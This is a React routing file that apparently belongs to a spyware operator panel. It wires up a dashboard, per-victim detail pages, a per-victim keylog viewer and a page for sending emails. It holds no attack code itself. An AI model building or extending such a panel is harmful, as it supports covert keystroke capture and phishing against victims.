import React from 'react';
import { BrowserRouter as Router, Routes, Route } from 'react-router-dom';
import Dashboard from './pages/Dashboard';
import VictimDetail from './pages/VictimDetail';
import KeyLogs from './pages/Keylogs';
import Navbar from './components/Navbar';
import SendEmail from './pages/SendEmail';

function App() {
  return (
    <Router>
      <Navbar />
      <Routes>
        <Route path="/" element={<Dashboard />} />
        <Route path="/victim/:id" element={<VictimDetail />} />
        <Route path="/victim/:id/keylogs" element={<KeyLogs />} />
        <Route path="/send-email" element={<SendEmail />} />
      </Routes>
    </Router>
  );
}

export default App;
